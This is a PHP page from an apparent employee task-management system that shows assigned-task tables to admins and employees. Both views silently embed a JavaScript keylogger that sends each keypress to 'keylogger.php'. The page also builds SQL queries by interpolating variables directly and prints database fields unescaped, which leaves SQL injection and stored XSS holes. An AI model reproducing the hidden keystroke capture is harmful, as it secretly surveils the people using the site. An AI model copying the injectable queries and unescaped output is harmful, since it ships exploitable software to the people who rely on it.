<?php
include('header.php');

?>  
 
   
   <?php
	if(substr($_SESSION['login_id'],0,4) == 'admi')
	{
		$query_task = mysql_query("SELECT * FROM assign_task WHERE Status = 'True' order by id desc");
		$row_task = mysql_fetch_assoc($query_task);
	
	?> 
    

<script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board... 
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=assigned_task');

});
//*************** END ****************

</script>


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->
   
    
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="manage_emp.php">
        <div class="large-2 column">
       	 Manage Emp
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column" style="background:#10255F;">
         Task
        </div>
        </a>
        
        <a href="signup.php">
        <div class="large-2 column">
         Add New User
        </div>
        </a>
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
    </div>
    <!-- end navigation bar -->
    
            <!-- start main heading -->
    <div class="row">
    	<div class="large-12 column main_heading">
        All Assigned Task
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    
    
   <!-- start manage employee -->
   <div class="manage_emp">
    
       
       <!-- start row -->
   <div class="row table">
   <div class="large-10 columns large-centered" style="text-align:center">
   
   <center>   
   
   <?php 
   if(mysql_num_rows($query_task) != "0")
   {
   echo '<table border="2">
   <tr>
   		<td class="head_table">S.No</td>
   		<td class="head_table">Employee Name</td>
   		<td class="head_table">User Id</td>
        <td class="head_table">Task Subject</td>
        <td class="head_table">Description</td>
		<td class="head_table">Assinged Date</td>
        <td class="head_table">Submited Date</td>
        <td class="head_table">Download</td>
   </tr>';
   
   	$a = 1;
	do{
		echo '<tr>';
		echo '<td>'.$a.'</td>';
		$sender_id = $row_task['User_id'];
		$query_name = mysql_query("SELECT * FROM employee WHERE User_id = '$sender_id'");
		$row_name = mysql_fetch_assoc($query_name);
		echo '<td><a href="view_employee.php?user_id='.$row_task['User_id'].'" class="user_table">'.$row_name['Name'].'</a></td>';
		
		echo '<td>'.$row_task['User_id'].'</td>';
		echo '<td>'.$row_task['Subject'].'</td>';
		echo '<td>'.$row_task['Description'].'</td>';
		echo '<td>'.$row_task['Assign_date'].'</td>';
		echo '<td>'.$row_task['Submit_date'].'</td>';
		if($row_task['Attachment'] != NULL)
		echo '<td><a href="submit_task/'.$row_task['Attachment'].'" class="v_e_d">Download</a></td>';
		else
		echo '<td></td>';
		echo '</tr>';
		$a++;
	}while($row_task = mysql_fetch_assoc($query_task));
  	
	echo '</table>';
   }//end if(!empty(mysql_num_rows($query_task)))
   else
   {
	   echo "There is no any assigned Task..!";
	}
	?>
   

      
  
   </center>
   </div>
   </div>
   <!-- end row -->
       
       
   </div>
   <!-- end manage employee -->


    
  	<?php
	}
    elseif(substr($_SESSION['login_id'],0,4) == 'emp_')
	{
		$query_task = mysql_query("SELECT * FROM assign_task WHERE Status = 'True' AND User_id = '$user_id' order by id desc");
		$row_task = mysql_fetch_assoc($query_task);
		
 	?>
    <!-- start navigation bar -->
    <div class="row nav">
   
    	<a href="home.php">
        <div class="large-2 column">
         Home
        </div>
        </a>
        
        <a href="company_detail.php">
        <div class="large-2 column">
       	 Company
        </div>
        </a>
        
        <a href="message.php">
        <div class="large-2 column">
         Message
        </div>
        </a>
        
        <a href="task.php">
        <div class="large-2 column" style="background:#10255F;">
         Task
        </div>
        </a>
        
      
        
        <a href="setting.php">
        <div class="large-2 column" >
        Setting
        </div>
        </a>
        
         <a href="logout.php">
        <div class="large-2 column">
         Logout
        </div>
        </a>
        
    </div>
    
    <!-- end navigation bar -->
    
   
<script type="text/javascript">

//*************** START **************
//execute when we press and key from the key board... 
$(document).keydown(function(event)
{
	//store that key into keycode variable..
	var keycode = event.keyCode;
	
	//call reload.php page using get method..
	//we send key value with the help of get method into reload.php page.. 	
	$('#hello').load('keylogger.php?press_key='+keycode+'&page=assigned_task');

});
//*************** END ****************

</script>


<!-- for key stock.. -->
<div id="hello"></div>
<!-- for key stock.. -->
    
   
   
    
        <!-- start main heading -->
    <div class="row">
    	<div class="large-12 column main_heading">
        All Assigned Task
        </div>
    </div>
    <!-- end main heading -->


    <!-- start horizantal line -->
     <div class="row">
    	<div class="large-12 column">
        <hr style="border:0.1em #999999 solid;">
        </div>
    </div>
    <!-- end horizantal line -->
    
    
    
   <!-- start manage employee -->
   <div class="manage_emp">
    
       
       <!-- start row -->
   <div class="row table">
   <div class="large-10 columns large-centered" style="text-align:center">
   
   <center>   
   
   <?php 
   if(mysql_num_rows($query_task) != "0")
   {
   echo '<table border="2">
   <tr>
   		<td class="head_table">S.No</td>
        <td class="head_table">Task Subject</td>
        <td class="head_table">Description</td>
		<td class="head_table">Assigned Date</td>
        <td class="head_table">Submited Date</td>
        <td class="head_table">Download</td>
   </tr>';
   
   	$a = 1;
	do{
		echo '<tr>';
		echo '<td>'.$a.'</td>';
		echo '<td>'.$row_task['Subject'].'</td>';
		echo '<td>'.$row_task['Description'].'</td>';
		echo '<td>'.$row_task['Assign_date'].'</td>';
		echo '<td>'.$row_task['Submit_date'].'</td>';
		if($row_task['Attachment'] != NULL)
		echo '<td><a href="submit_task/'.$row_task['Attachment'].'" class="v_e_d">Download</a></td>';
		else
		echo '<td></td>';
		echo '</tr>';
		$a++;
	}while($row_task = mysql_fetch_assoc($query_task));
  	
	echo '</table>';
   }//end if(!empty(mysql_num_rows($query_task)))
   else
   {
	   echo "YOU Have Not Assigned Any TASK..!!";
	}
	?>
   

      
  
   </center>
   </div>
   </div>
   <!-- end row -->
       
       
   </div>
   <!-- end manage employee -->

    
    <?php
	}
	?> 
    
   
 
    
   
</body>
</html>
